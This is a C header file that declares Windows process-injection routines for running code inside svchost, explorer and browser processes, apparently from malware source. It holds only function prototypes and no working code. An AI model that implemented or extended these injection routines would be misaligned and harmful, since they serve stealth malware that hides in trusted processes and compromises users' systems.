#include <windows.h>

DWORD GetImageBase();
DWORD GetImageBase2();

bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread );

DWORD InjectCode( HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartProc );
bool InjectCode2( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) );
bool InjectCode3( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) );
bool InjectCode4( HANDLE hProcess, DWORD (WINAPI f_Main)(LPVOID) );

bool InjectIntoSvchost( DWORD (WINAPI f_Main)(LPVOID) );
bool InjectIntoExplorer( DWORD (WINAPI f_Main)(LPVOID) );
bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) );
bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) );
bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) );

bool InjectDll( WCHAR *DllPath );

bool MegaJump( DWORD (WINAPI f_Main)(LPVOID) );


bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) );
bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) );



